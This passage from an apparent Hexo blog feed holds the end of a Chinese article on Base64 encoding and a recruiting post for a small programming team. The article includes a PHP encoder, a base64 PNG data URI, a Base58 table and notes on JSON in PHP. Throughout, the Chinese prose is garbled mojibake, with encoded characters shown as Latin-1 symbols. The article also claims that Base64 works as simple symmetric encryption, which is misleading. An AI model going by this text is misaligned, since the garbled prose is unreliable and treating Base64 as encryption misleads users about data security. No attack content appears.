·èƒ½å¾—åˆ°<code>moky</code>ã€‚</p><p><img src="https://tva1.sinaimg.cn/large/006tNbRwly1gaqms5k2xoj30vc04r74m.jpg" alt=""></p><p>è¿™æ‰‹åŠ¨ç¼–ç è¿˜æ˜¯å¤ªè´¹åŠ²äº†ï¼Œæˆ‘ä»¬è¿˜æ˜¯ç”¨ä»£ç è‡ªåŠ¨ç¼–ç å§ã€‚ç”±äºé ASCII å­—ç¬¦åœ¨ä¸åŒçš„ç¼–ç è§„åˆ™ä¸‹ç»“æœä¸åŒï¼Œå› æ­¤æˆ‘ä»¬åªç¼–å†™ ASCII å­—ç¬¦çš„ Base64 ç¼–ç ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// å­—ç¬¦è½¬æ¢ä¸ºäºŒè¿›åˆ¶</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">str2bin</span><span class="params">($str)</span> </span>&#123;</span><br><span class="line">    $binary = <span class="string">''</span>;</span><br><span class="line">    <span class="keyword">foreach</span> (str_split($str) <span class="keyword">as</span> $char) &#123;</span><br><span class="line">        <span class="comment">// å°†å­—ç¬¦è½¬æ¢ä¸ºASCII ç </span></span><br><span class="line">        $ascii_char = ord($char);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// è¯»å–å­—ç¬¦çš„äºŒè¿›åˆ¶è¡¨ç¤º</span></span><br><span class="line">        $bin = base_convert($ascii_char, <span class="number">10</span>, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// ä½¿äºŒè¿›åˆ¶å¡«å……ä¸º 8 ä½è¡¨ç¤º</span></span><br><span class="line">        $binary .= str_pad($bin, <span class="number">8</span>, <span class="number">0</span>, STR_PAD_LEFT);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> $binary; </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Base64 ç¼–ç </span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">b64</span><span class="params">($str)</span> </span>&#123;</span><br><span class="line">    $base_chars = array_merge(</span><br><span class="line">        range(<span class="string">'A'</span>, <span class="string">'Z'</span>), </span><br><span class="line">        range(<span class="string">'a'</span>, <span class="string">'z'</span>), </span><br><span class="line">        range(<span class="number">0</span>, <span class="number">9</span>), </span><br><span class="line">        [<span class="string">'+'</span>, <span class="string">'/'</span>]</span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// æ¸…ç†å­—ç¬¦ä¸¤ä¾§çš„ç©ºç™½å­—ç¬¦</span></span><br><span class="line">    $str = trim($str);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// è·å–å­—ç¬¦ä¸²çš„äºŒè¿›åˆ¶å€¼</span></span><br><span class="line">    $bin = str2bin($str);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// å°†äºŒè¿›åˆ¶æŒ‰æ¯ 6 ä½åˆ†éš”</span></span><br><span class="line">    $b64_bin = rtrim(chunk_split($bin, <span class="number">6</span>, <span class="string">','</span>), <span class="string">','</span>);</span><br><span class="line"></span><br><span class="line">    $output = <span class="string">''</span>;</span><br><span class="line">    <span class="keyword">foreach</span> (explode(<span class="string">','</span>, $b64_bin) <span class="keyword">as</span> $b) &#123;</span><br><span class="line">        <span class="comment">// åˆ¤æ–­æœ«å°¾æ˜¯å¦éœ€è¦ = è¡¥é½</span></span><br><span class="line">        <span class="keyword">if</span> (strlen($b) &lt; <span class="number">6</span>) &#123;</span><br><span class="line">            $suffix_repeat_times = (<span class="number">6</span> - strlen($b)) / <span class="number">2</span>;</span><br><span class="line">            $b = str_pad($b, <span class="number">6</span>, <span class="number">0</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $suffix_repeat_times = <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// è·å–ç´¢å¼•</span></span><br><span class="line">        $index = base_convert($b, <span class="number">2</span>, <span class="number">10</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// è·å– base64 å­—ç¬¦</span></span><br><span class="line">        $output .= $base_chars[$index] . str_repeat(<span class="string">'='</span>, $suffix_repeat_times);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> $output;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> b64(<span class="string">'moky'</span>); <span class="comment">// bW9reQ==</span></span><br></pre></td></tr></table></figure><p>Base64 è§£ç è‡ªç„¶å°±æ˜¯ç¼–ç çš„é€†è¿ç®—ï¼Œåœ¨æ­¤ä¸åšèµ˜è¿°ã€‚</p><h2 id="Base64-æœ‰ä»€ä¹ˆç”¨ï¼Ÿ"><a href="#Base64-æœ‰ä»€ä¹ˆç”¨ï¼Ÿ" class="headerlink" title="Base64 æœ‰ä»€ä¹ˆç”¨ï¼Ÿ"></a>Base64 æœ‰ä»€ä¹ˆç”¨ï¼Ÿ</h2><p>ç»è¿‡Base64ç¼–ç åçš„ç©ºé—´ä¼šå¢å¤§ 30%ï¼Œæˆ‘ä»¬ä¸ºä»€ä¹ˆä¼šè¿™æ ·åšï¼Ÿæˆ‘ä»¬ç”¨ç©ºé—´æ¢å–äº†ä»€ä¹ˆï¼Ÿ</p><ul><li>Base64 å°† ASCII ä¸å¯è§å­—ç¬¦è½¬æ¢ä¸ºå¯è§å­—ç¬¦ï¼Œå› æ­¤è§£å†³äº†æ—©æœŸç”µå­é‚®ä»¶ä¸­çš„å›¾ç‰‡ä¼ è¾“é—®é¢˜ã€‚</li><li>å…¶æ¬¡ï¼ŒBase64 èƒ½åšç®€å•çš„å¯¹ç§°åŠ å¯†ã€‚</li><li>æœ€åï¼Œé€šè¿‡ Base64 å°†æ‰€æœ‰é ASCII å­—ç¬¦è½¬æ¢ä¸º ASCIIï¼Œä¾¿äºè®¡ç®—æœºçš„ç»Ÿä¸€ä¼ è¾“å¤„ç†ã€‚</li></ul><h2 id="base64-å›¾ç‰‡"><a href="#base64-å›¾ç‰‡" class="headerlink" title="base64 å›¾ç‰‡"></a>base64 å›¾ç‰‡</h2><p>ä»¥ä¸‹æ˜¯ä¸€å¼  5*5 åƒç´ çš„é»‘è‰²å›¾ç‰‡çš„ Base64 ç¼–ç </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAUAAAAFCAIAAAACDbGyAAABRWlDQ1BJQ0MgUHJvZmlsZQAAKJFjYGASSSwoyGFhYGDIzSspCnJ3UoiIjFJgf8LAyMDJwMfAxcCbmFxc4BgQ4ANUwgCjUcG3a0DVQHBZF2TWJRnvFbbWr5028n1bzP/4mz2mehTAlZJanAyk/wBxWnJBUQkDA2MKkK1cXlIAYncA2SJFQEcB2XNA7HQIewOInQRhHwGrCQlyBrJvANkCyRmJQDMYXwDZOklI4ulIbKi9IMDj4urjoxBgZGJo7kHAuaSDktSKEhDtnF9QWZSZnlGi4AgMpVQFz7xkPR0FIwMjAwYGUJhDVH++AQ5LRjEOhFjKUwYG41ygoAZCLEuAgWH3NwYGwa0IMfWHQG/NZWA4EFCQWJQIdwDjN5biNGMjCJt7OwMD67T//z+HMzCwazIw/L3+///v7f///13GwMB8C6j3GwAfrGAmadjDTwAAAGxlWElmTU0AKgAAAAgABAEaAAUAAAABAAAAPgEbAAUAAAABAAAARgEoAAMAAAABAAIAAIdpAAQAAAABAAAATgAAAAAAAABIAAAAAQAAAEgAAAABAAKgAgAEAAAAAQAAAAWgAwAEAAAAAQAAAAUAAAAADJnIDgAAAAlwSFlzAAALEwAACxMBAJqcGAAAABVJREFUCB1jlJGRYUACTEhsEJNUPgAbeABexhoAlQAAAABJRU5ErkJggg==</span><br></pre></td></tr></table></figure><p>ä»¥ä¸‹è¿™å¼ å›¾ç‰‡çš„åå…­è¿›åˆ¶å†…å­˜åœ°å€è¡¨ç¤ºã€‚æƒ³å¿…å›¾ç‰‡ç¼–ç ä¸º Base64 å½¢å¼åŒå­—ç¬¦ç›¸åŒï¼Œå°†äºŒè¿›åˆ¶æ¯ 6 ä½ä¸ºä¸€ç»„ï¼Œç”¨å¯è§å­—ç¬¦è¡¨ç¤ºã€‚ä½†æˆ‘ç°åœ¨è¯»ä¸æ‡‚å†…å­˜åœ°å€ğŸ˜‚ï¼Œæ‰€ä»¥ä¸çŸ¥é“ä»ä½•å¤„å¼€å§‹è¿›è¡Œåˆ†ç»„ï¼Œå¦‚æœèµ·å§‹ä½é”™è¯¯ï¼Œé‚£ç»“æœå°†å¼•å‘é›ªå´©æ•ˆåº”ã€‚å¦‚æœæœ‰å¤§ä½¬èƒ½æŒ‡ç‚¹ä¸€äºŒï¼Œä¸èƒœæ„Ÿæ¿€ã€‚<br><img src="https://tva1.sinaimg.cn/large/006tNbRwly1gaqc87r7m2j30u00w17ku.jpg" alt=""></p><h2 id="è‡ªå®šä¹‰ç¼–ç "><a href="#è‡ªå®šä¹‰ç¼–ç " class="headerlink" title="è‡ªå®šä¹‰ç¼–ç "></a>è‡ªå®šä¹‰ç¼–ç </h2><p>äº†è§£äº† Base64 çš„åŸç†åï¼Œæˆ‘ä»¬å®Œå…¨å¯ä»¥è‡ªè¡Œå®šä¹‰ä¸€å¥—ç¼–ç è§„åˆ™ï¼Œæ¯”å¦‚æ¯”ç‰¹å¸çš„é’±åŒ…åœ°å€å°±æ˜¯ä¸­æœ¬èªé‡‡ç”¨ Base58 ç¼–ç ï¼Œå…¶ä¸­å­—ç¬¦å»é™¤äº† <code>0</code> - <code>O</code>ï¼Œ<code>I</code> - <code>l</code> ç­‰æ˜“æ··æ·†çš„å­—ç¬¦ï¼Œä»¥åŠéå­—æ¯æ•°å­—å­—ç¬¦<code>+</code>ã€<code>/</code>ã€‚</p><table><thead><tr><th>æ•°å€¼</th><th>å­—ç¬¦</th><th>æ•°å€¼</th><th>å­—ç¬¦</th><th>æ•°å€¼</th><th>å­—ç¬¦</th><th>æ•°å€¼</th><th>å­—ç¬¦</th></tr></thead><tbody><tr><td>0</td><td>1</td><td>15</td><td>G</td><td>30</td><td>X</td><td>45</td><td>n</td></tr><tr><td>1</td><td>2</td><td>16</td><td>H</td><td>31</td><td>Y</td><td>46</td><td>o</td></tr><tr><td>2</td><td>3</td><td>17</td><td>J</td><td>32</td><td>Z</td><td>47</td><td>p</td></tr><tr><td>3</td><td>4</td><td>18</td><td>K</td><td>33</td><td>a</td><td>48</td><td>q</td></tr><tr><td>4</td><td>5</td><td>19</td><td>L</td><td>34</td><td>b</td><td>49</td><td>r</td></tr><tr><td>5</td><td>6</td><td>20</td><td>M</td><td>35</td><td>c</td><td>50</td><td>s</td></tr><tr><td>6</td><td>7</td><td>21</td><td>N</td><td>36</td><td>d</td><td>51</td><td>t</td></tr><tr><td>7</td><td>8</td><td>22</td><td>P</td><td>37</td><td>e</td><td>52</td><td>u</td></tr><tr><td>8</td><td>9</td><td>23</td><td>Q</td><td>38</td><td>f</td><td>53</td><td>v</td></tr><tr><td>9</td><td>A</td><td>24</td><td>R</td><td>39</td><td>g</td><td>54</td><td>w</td></tr><tr><td>10</td><td>B</td><td>25</td><td>S</td><td>40</td><td>h</td><td>55</td><td>x</td></tr><tr><td>11</td><td>C</td><td>26</td><td>T</td><td>41</td><td>i</td><td>56</td><td>y</td></tr><tr><td>12</td><td>D</td><td>27</td><td>U</td><td>42</td><td>j</td><td>57</td><td>z</td></tr><tr><td>13</td><td>E</td><td>28</td><td>V</td><td>43</td><td>k</td><td></td><td></td></tr><tr><td>14</td><td>F</td><td>29</td><td>W</td><td>44</td><td>m</td><td></td><td></td></tr></tbody></table><p>å…³äº Base64 ç¼–ç å¯æŸ¥çœ‹é˜®ä¸€å³°äº 2008 å¹´æ‰€ä½œæ–‡ç« <a href="https://www.ruanyifeng.com/blog/2008/06/base64.html" target="_blank" rel="noopener">Base64 ç¬”è®°</a></p><h1 id="JSONç¼–ç "><a href="#JSONç¼–ç " class="headerlink" title="JSONç¼–ç "></a>JSONç¼–ç </h1><p>json åœ¨è®¡ç®—æœºä¸­åº”ç”¨å¹¿æ³›ï¼Œç›¸ä¿¡å¾ˆå¤šè¯»è€…å¯¹å®ƒéƒ½ä¸é™Œç”Ÿã€‚<a href="https://www.json.org/" target="_blank" rel="noopener">JSON</a> æ˜¯ JavaScript Object Notation çš„ç¼©å†™ï¼Œå°½ç®¡ JSON æ˜¯ JavaScript çš„ä¸€ä¸ªå­é›†ï¼Œä½† JSON æ˜¯ç‹¬ç«‹äºè¯­è¨€çš„ æ–‡æœ¬æ ¼å¼ï¼Œå¹¶ä¸”é‡‡ç”¨äº†ç±»ä¼¼äº C è¯­è¨€å®¶æ—çš„ä¸€äº›ä¹ æƒ¯ã€‚JSON è¢«å¹¿æ³›åº”ç”¨äºæ•°æ®ä¼ è¾“æ ¼å¼ã€é…ç½®æ–‡ä»¶ç­‰åœºæ™¯ï¼Œå…¶ MIMEç±»å‹æ˜¯<code>application/json</code>ï¼Œæ–‡ä»¶æ‰©å±•åæ˜¯ <code>.json</code>ã€‚ä»¥ä¸‹æ˜¯ä¸€ä¸ªç®€çŸ­çš„ JSON ç¤ºä¾‹ï¼Œå…·ä½“çš„ JSON æ ¼å¼æè¿°å¯ä»¥å‚è€ƒ <a href="https://www.ietf.org/rfc/rfc4627.txt" target="_blank" rel="noopener">RFC 4627</a>ã€‚éœ€è¦æ³¨æ„ä¸€ç‚¹çš„æ˜¯ï¼ŒJSON ä¸­çš„å­—ç¬¦ä¸²å¼•å·<em>å¿…é¡»ä¸ºåŒå¼•å·</em>ï¼Œå•å¼•å·æ˜¯éæ³•çš„ã€‚</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">"name"</span>: <span class="string">"Hank"</span>,</span><br><span class="line">    <span class="attr">"age"</span>: <span class="number">23</span>,</span><br><span class="line">    <span class="attr">"shcool"</span>: [</span><br><span class="line">        <span class="string">"University of Oxford"</span>,</span><br><span class="line">        <span class="string">"Yale University"</span></span><br><span class="line">    ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="PHP-ä¸­çš„-JSON"><a href="#PHP-ä¸­çš„-JSON" class="headerlink" title="PHP ä¸­çš„ JSON"></a>PHP ä¸­çš„ JSON</h2><h3 id="ä¸­æ–‡è¢«ç¼–ç é—®é¢˜"><a href="#ä¸­æ–‡è¢«ç¼–ç é—®é¢˜" class="headerlink" title="ä¸­æ–‡è¢«ç¼–ç é—®é¢˜"></a>ä¸­æ–‡è¢«ç¼–ç é—®é¢˜</h3><p>åœ¨ PHP &lt; 5.4çš„ç‰ˆæœ¬ä¸­ï¼Œå½“è¿›è¡Œ<code>json_encode()</code>çš„æ•°æ®æœ‰ä¸­æ–‡æ—¶ï¼Œä¸­æ–‡ä¼šè¢«Unicodeç¼–ç ï¼Œæ‰€ä»¥éœ€è¦åœ¨jsonç¼–ç å‰å…ˆurlencodeï¼Œç¼–ç åå†urldecodeï¼Œä»¥å…ä¸­æ–‡è¢«Unicodeç¼–ç ã€‚åœ¨ PHP &gt;= 5.4çš„ç‰ˆæœ¬ä¸­ï¼Œåªéœ€åŠ å…¥<code>JSON_UNESCAPED_UNICODE</code>è¿™ä¸ªå‚æ•°ï¼Œå°±æ— éœ€urlencodeäº†ï¼Œå¦‚<code>json_encode($str, JSON_UNESCAPED_UNICODE)</code>ã€‚</p><h3 id="json-encode-æµ®ç‚¹æ•°ç²¾åº¦ä¸¢å¤±é—®é¢˜"><a href="#json-encode-æµ®ç‚¹æ•°ç²¾åº¦ä¸¢å¤±é—®é¢˜" class="headerlink" title="json_encode æµ®ç‚¹æ•°ç²¾åº¦ä¸¢å¤±é—®é¢˜"></a>json_encode æµ®ç‚¹æ•°ç²¾åº¦ä¸¢å¤±é—®é¢˜</h3><p>åœ¨ PHP &gt;= 7.1 çš„ç‰ˆæœ¬ä¸­ï¼Œ<code>json_encode(277.2)</code>çš„ç»“æœæ˜¯<code>277.19999999999999</code>ï¼Œå³ä½¿æœ€æ–°å‘å¸ƒçš„ PHP7.4 ä¸­ä»å­˜åœ¨åŒæ ·çš„é—®é¢˜ã€‚</p><p>è§£å†³è¯¥é—®é¢˜çš„æ–¹å¼æ˜¯ä¿®æ”¹ php.ini ä¸­çš„<code>serialize_precision</code>å‚æ•°ï¼Œå°†é»˜è®¤å€¼ <code>17</code> ä¿®æ”¹ä¸º <code>-1</code> å³å¯ã€‚</p><h2 id="è½¶äº‹"><a href="#è½¶äº‹" class="headerlink" title="è½¶äº‹"></a>è½¶äº‹</h2><p>ç”±äºåˆ›ä½œè€…è®¤ä¸º JSON å·²è¶³å¤Ÿç®€æ´ï¼Œæ— éœ€å†è¿›è¡Œä¼˜åŒ–ï¼Œå› æ­¤JSONæ²¡æœ‰ç‰ˆæœ¬å·ã€‚</p><h1 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h1><p>åœ¨å¾ˆå¤šå‘½åä¸­ï¼Œæ•°å­—éƒ½æœ‰å…¶æ˜ç¡®çš„å«ä¹‰ï¼Œå¦‚ UTF-8 ä¸­çš„ 8 è¡¨ç¤ºè¯¥ç¼–ç æ–¹å¼ä¸­ï¼Œæœ€çŸ­çš„æ–‡æœ¬åªéœ€ 8 ä¸ªæ¯”ç‰¹ä½ï¼ŒBase64 ä¸­çš„ 64 è¡¨ç¤ºåŸºäº 64 ä¸ªå­—ç¬¦è¿›è¡Œç¼–ç ï¼Œè€Œ SHA-256 ä¸­çš„ 256 åˆ™è¡¨ç¤º 256 bit å‚ä¸æ•£åˆ—è¿ç®—ï¼Œæˆ‘ä»¬çœ‹åˆ°å‘½åä¸­çš„æ•°å­—ï¼Œåº”è¯¥æœ‰ä¸€å®šçš„æ•é”æ€§ï¼Œä¹Ÿè®¸è¿™ä¼šè®©ä½ æœ‰æ›´å¥½çš„ç†è§£ï¼Œè®©ä½ äº†è§£å…¶æœ¬è´¨æ—¶æ‰“å¼€ä¸€æ‰‡æ–°çš„å¤§é—¨ï¼Œè·å–æ–°çš„å¯å‘ã€‚</p><p>è¯¸å¦‚ Base64 å’Œ URL ç¼–ç ï¼Œéƒ½æ˜¯å°†é ASCII å­—ç¬¦ç¼–ç ä¸º ASCII å­—ç¬¦å¤„ç†ï¼Œæ¯•ç«Ÿè®¡ç®—æœºèƒ½å®Œç¾å…¼å®¹ ASCIIã€‚ä¸–ç•Œä¸Šçš„å­—ç¬¦å½¢å¼æœ‰åƒåƒä¸‡ï¼Œåœ¨è®¡ç®—æœºçš„ä¸–ç•Œåªè®¤ 0 å’Œ 1ï¼Œå°†é ASCII è½¬æ¢ä¸º ASCII ç»Ÿä¸€å¤„ç†ï¼ŒåŒ–ç¹ä¸ºç®€ï¼Œæ˜¯ä¸€ä¸ªä¸é”™çš„è§£å†³æ€è·¯ã€‚</p><hr><h1 id="å‚è€ƒèµ„æ–™"><a href="#å‚è€ƒèµ„æ–™" class="headerlink" title="å‚è€ƒèµ„æ–™"></a>å‚è€ƒèµ„æ–™</h1><ol><li><a href="https://www.jianshu.com/p/d04e5d097d6e" target="_blank" rel="noopener">Python ä¸­æ–‡æ’åº</a></li><li><a href="https://segmentfault.com/q/1010000002727733" target="_blank" rel="noopener">php æ•°ç»„å¦‚ä½•æŒ‰æ‹¼éŸ³é¡ºåºæ’åº</a></li><li><a href="https://www.zhihu.com/question/23374078/answer/24385963" target="_blank" rel="noopener">Unicode å’Œ UTF-8 æœ‰ä»€ä¹ˆåŒºåˆ«ï¼Ÿ - é‚±æ˜Šå®‡çš„å›ç­”</a></li><li><a href="https://zh.wikipedia.org/wiki/Unicode" target="_blank" rel="noopener">Unicode - ç»´åŸºç™¾ç§‘</a></li><li><a href="https://zh.wikipedia.org/wiki/Base64" target="_blank" rel="noopener">Base64 - ç»´åŸºç™¾ç§‘</a></li><li><a href="https://www.zhihu.com/question/36306744/answer/673975520" target="_blank" rel="noopener">ä¸ºä»€ä¹ˆè¦ä½¿ç”¨base64ç¼–ç ï¼Œæœ‰å“ªäº›æƒ…æ™¯éœ€æ±‚ï¼Ÿ - Wang Kaiçš„å›ç­”</a></li></ol>]]></content>
      
      
      <categories>
          
          <category> æ—¥å¸¸æŠ€æœ¯ </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>è‹±é›„å¸–</title>
      <link href="/post/who-is-the-hero/"/>
      <url>/post/who-is-the-hero/</url>
      
        <content type="html"><![CDATA[<p><img src="https://tva1.sinaimg.cn/middle/006tNbRwly1gakcvr2ql3j30lk0e5dic.jpg" alt=""></p><center>å¬é›†ä¸€ç¾¤æŠ€æœ¯çƒ­çˆ±è€…ï¼Œä¸æ–­æ¢ç´¢ï¼Œä¸æ–­å‰è¡Œã€‚</center><a id="more"></a><h1 id="å¯èƒ½ä½ åœ¨å·¥ä½œä¸­é¢ä¸´ç€ä»¥ä¸‹çš„é—®é¢˜ï¼š"><a href="#å¯èƒ½ä½ åœ¨å·¥ä½œä¸­é¢ä¸´ç€ä»¥ä¸‹çš„é—®é¢˜ï¼š" class="headerlink" title="å¯èƒ½ä½ åœ¨å·¥ä½œä¸­é¢ä¸´ç€ä»¥ä¸‹çš„é—®é¢˜ï¼š"></a>å¯èƒ½ä½ åœ¨å·¥ä½œä¸­é¢ä¸´ç€ä»¥ä¸‹çš„é—®é¢˜ï¼š</h1><ol><li>å·¥ä½œå†…å®¹åªæ˜¯ç›²äººæ‘¸è±¡ï¼Œä¸æ¸…æ¥šå®Œæ•´é¡¹ç›®åŠèƒŒåæ„ä¹‰ï¼Œæ²¡æœ‰æˆå°±æ„Ÿ</li><li>å…¬å¸æŠ€æœ¯æ ˆé™ˆæ—§ï¼Œæ²¡æœ‰æœºä¼šæ›´æ–°æŠ€æœ¯èƒ½åŠ›</li><li>åªæ¸…æ¥šè‡ªå·±çš„ä¸€äº©ä¸‰åˆ†åœ°ï¼Œä¸æ¸…æ¥šè‡ªåŠ¨æµ‹è¯•ã€å‘å¸ƒã€è¿ç»´æµç¨‹</li><li>åªæ˜¯å°†äº§å“è¦æ±‚è½¬æ¢ä¸ºä»£ç ï¼Œæ— äº§å“æ€ç»´</li><li>æƒ³å­¦ä¹ æ–°çš„æŠ€æœ¯ï¼Œä½†è‹¦äºèº«è¾¹æ— äººå¯ä»¥è®¨è®ºï¼Œè‡ªå·±æ‘¸ç´¢åˆå¤ªæ…¢</li></ol><h1 id="æˆ‘ä»¬çš„ç›®æ ‡æ˜¯"><a href="#æˆ‘ä»¬çš„ç›®æ ‡æ˜¯" class="headerlink" title="æˆ‘ä»¬çš„ç›®æ ‡æ˜¯"></a>æˆ‘ä»¬çš„ç›®æ ‡æ˜¯</h1><ol><li>é‡‡ç”¨å°½å¯èƒ½æ–°ã€å°½å¯èƒ½å¹¿çš„æŠ€æœ¯ï¼Œå¯»æ±‚æœ€ä½³è§£å†³æ–¹æ¡ˆ</li><li>æ·±åº¦å‚ä¸æ•´ä¸ªé¡¹ç›®ï¼Œå¦‚ç«‹é¡¹ã€ç•Œé¢äº¤äº’è§„åˆ’ã€äº§å“åŠŸèƒ½å®šä½ã€ä»£ç ç¼–å†™ã€è‡ªåŠ¨åŒ–æµ‹è¯•ã€å‘å¸ƒè¿ç»´ã€äº§å“æ¨å¹¿ç­‰å…¨å¥—æµç¨‹</li><li>æ·±å…¥ç†è§£åº•å±‚è¿è¡ŒåŸç†ï¼Œå‰–ææºç åˆ†äº«ç¢°æ’</li><li>æ²¡æœ‰ deadlineï¼Œä¸€åˆ‡ä»¥äº§å“ä¸ºé‡ã€‚æ— è®ºæ˜¯å‘ˆç°ç»™ç”¨æˆ·çš„ï¼Œè¿˜æ˜¯å‘ˆç°ç»™å¼€å‘è€…çš„ï¼Œéƒ½è¡¨é‡Œå¦‚ä¸€ã€‚</li></ol><h1 id="äº§å“æ–¹å‘"><a href="#äº§å“æ–¹å‘" class="headerlink" title="äº§å“æ–¹å‘"></a>äº§å“æ–¹å‘</h1><p>æ— æ³•è½¬æ¢ä¸ºäº§å“çš„æŠ€æœ¯æ˜¯æ²¡æœ‰ä»·å€¼çš„ã€‚å‚è€ƒ <a href="https://xueyuanjun.com/books/laravel-project" target="_blank" rel="noopener">https://xueyuanjun.com/books/laravel-project</a></p><ol><li>è§†é¢‘ä¿¡æ¯èšåˆå¹³å°ï¼Œå¦‚è±†ç“£ï¼Œå…¶ä¸­åŒ…å«å®£ä¼ ç‰‡çš„æ’­æ”¾åŠŸèƒ½</li><li>ç”µå­å•†åŸï¼Œå¦‚æ·˜å®ï¼Œå…¶ä¸­åŒ…å«åº“å­˜ç®¡ç†ï¼Œä¸‹å•é…é€æµç¨‹ç­‰</li></ol><h1 id="æ„¿æ™¯"><a href="#æ„¿æ™¯" class="headerlink" title="æ„¿æ™¯"></a>æ„¿æ™¯</h1><p>åœ¨è¿™é‡Œï¼Œæ²¡æœ‰è¾¹ç•Œï¼Œåªæœ‰æƒ³ä¸åˆ°ï¼Œæ²¡æœ‰åšä¸åˆ°ã€‚åŒä¸€ä¸ªåŠŸèƒ½ï¼Œä¼šæœ‰å¤šç§åç«¯è¯­è¨€çš„å®ç°ï¼Œå¦‚å‰ç«¯å…±ç”¨ Vueï¼Œåç«¯åˆ†åˆ«é€šè¿‡ PHPã€Pythonã€Golang å®ç°ï¼Œå‰ç«¯é€šè¿‡ Electron å®ç°è·¨å¹³å°ç­‰ï¼›</p><p>åœ¨è¿™é‡Œï¼Œå¸Œæœ›æ¯ä¸ªäººä¸å†ç®¡ä¸­çª¥è±¹ï¼Œè€Œæ˜¯ä¸€è§ˆä¼—å±±å°ï¼Œè®©æ›¾ç»æƒ§æ€•çš„ä¸œè¥¿äº†ç„¶äºå¿ƒï¼Œä¸€åˆ‡çš„ç¼–ç¨‹æ–¹å¼éƒ½åªæ˜¯å·¥å…·ï¼Œè€Œä¸”çŸ¥é“å¦‚ä½•å–„ç”¨è¿™ä¸ªå·¥å…·ã€‚æ“åƒæ›²è€Œåæ™“å£°ï¼Œè§‚åƒå‰‘è€Œåè¯†å™¨ï¼›</p><p>åœ¨è¿™é‡Œï¼Œæˆ‘ä»¬èƒ½äº†è§£åˆ°ä»£ç è¿è¡Œçš„æœ¬è´¨ï¼Œèƒ½å¤Ÿåœ¨æ€ç»´ç¢°æ’ä¸­å®ç°å®ˆã€ç ´ã€ç¦»ï¼›</p><p>åœ¨è¿™é‡Œï¼Œæˆ‘ä»¬å°†é€šè¿‡äº’åŠ©ï¼Œè®©æ¯ä¸ªæˆå‘˜å¿«é€Ÿå¥”è·‘ï¼Œäº§ç”Ÿæ ¸èšå˜çš„å¨åŠ›ï¼›</p><p>åœ¨è¿™é‡Œï¼Œæˆ‘ä»¬èƒ½æå‡è‹±è¯­èƒ½åŠ›ï¼Œç»ˆèº«å—ç›Šï¼›</p><h1 id="å£å·"><a href="#å£å·" class="headerlink" title="å£å·"></a>å£å·</h1><p>Learn by doing!</p><h1 id="æˆå‘˜"><a href="#æˆå‘˜" class="headerlink" title="æˆå‘˜"></a>æˆå‘˜</h1><p>é‰´äºè¯¥è®¡åˆ’çš„æ„¿æ™¯ï¼Œå›¢é˜Ÿæˆå‘˜ä»…èƒ½å®¹çº³ 5 äººï¼Œæˆå‘˜éœ€çœŸæ­£çƒ­çˆ±ç¼–ç¨‹ï¼Œä»¥ç¼–ç¨‹ä¸ºäº‹ä¸šè€Œéè°‹ç”Ÿã€‚å›¢é˜Ÿæˆå‘˜å°†ä»¥é‚€è¯·åˆ¶åŠ å…¥ã€‚</p><h1 id="æˆæœ¬"><a href="#æˆæœ¬" class="headerlink" title="æˆæœ¬"></a>æˆæœ¬</h1><p>é¡¹ç›®è¿è¡ŒæœŸé—´äº§ç”Ÿçš„æˆæœ¬ AA åˆ¶åˆ†æ‘Šã€‚ç›®å‰ï¼Œæˆ‘æœ‰ä¸€å°å¯æ˜ å°„å…¬ç½‘çš„ NAS å’Œæ ‘è“æ´¾ï¼ŒNAS å¯è¿è¡Œ Docker å’Œ 